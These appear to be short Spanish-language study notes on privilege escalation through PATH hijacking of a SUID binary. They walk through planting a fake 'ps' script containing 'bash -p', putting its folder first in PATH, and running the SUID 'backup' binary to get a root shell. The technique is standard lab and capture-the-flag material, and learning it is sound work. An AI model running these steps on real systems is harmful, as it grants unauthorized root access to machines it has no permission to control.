# EXPLOTACION DE UN PATH HIJACKING A UN BINARIO SUID

* Cada comando tiene un ruta absoluta
```bash
  $ which whoami
```
* Creamos nuestra ruta como prioritaria para la ejecucion de nuestro comando
```bash
  bash-5.1$ touch whoami
  bash-5.1$ ls
  whoami
  bash-5.1$ chmod +x whoami
  bash-5.1$ vim whoami
  bash-5.1$ whoami
  pepito
  bash-5.1$ export PATH=.:$PATH
  bash-5.1$ whoami
      PID TTY          TIME CMD
    25863 pts/1    00:00:00 bash
    26145 pts/1    00:00:00 bash
    26147 pts/1    00:00:00 ps
  bash-5.1$
```

* Nos permites ver las propiedad de un binario ya compilado.
```bash
  bash-5.1$ strings backup
```

## Resumen
El hijacking consiste en manipular el path para usarlo a nuestro favor

```bash
  bash$ export PATH=/[ruta de nuestro archivo para manipular]:$PATH
  bash$ ./backup
  bash$ whoami
  root
  bash$
```

Lo que realizamos anteriormente fue una manipulacion del path accediendo a los permisos SUID del archivo backup ya que ese archivo utiliza el comando "ps" en la carpeta /tmp creamos un archivo con el nombre "ps" y la pusimos en el PATH para que buscara en /tmp y de ahi ejecute el comando.

```bash
  [archivo ps]
  bash -p
```
